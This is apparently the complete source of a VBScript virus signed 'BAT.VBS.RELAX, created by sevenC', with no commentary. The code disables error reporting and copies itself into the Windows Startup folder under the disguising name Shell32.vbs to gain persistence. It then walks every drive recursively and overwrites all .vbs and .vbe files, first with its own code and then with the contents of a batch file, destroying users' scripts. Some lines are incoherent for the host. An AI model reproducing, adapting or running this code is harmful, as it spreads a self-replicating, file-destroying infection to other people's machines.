On Error Resume Next
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set sucke = wscript.CreateObject("WScript.Shell")
Set Fso = CreateObject("scripting.FileSystemObject")
Set Drives=fso.drives
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
src = dropper.readall
set Trange = document.body.CreateTextRange
Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.vbs"
fso.Copyfile("C:\windows\relax.bat"), "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.bat"
Set Fso = createobject("scripting.filesystemobject") 
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
Function Dosearch(Path) 
Set Folder=fso.getfolder(path) 
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
Set dropper = Fso.createtextfile(file.path, True)
dropper.write src
dropper.Close
end if
If fso.GetExtensionName(file.path)="vbs" then 
Set fso = createobject("scripting.filesystemobject") 
Set ooooo = fso.opentextfile("C:\windows\relax.bat") 
oooooo = ooooo.readall 
ooooo.close 
Set dropper = Fso.createtextfile(file.path, True)
dropper.write oooooo
dropper.Close
end if
next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 
'BAT.VBS.RELAX
'CREATED BY sevenC
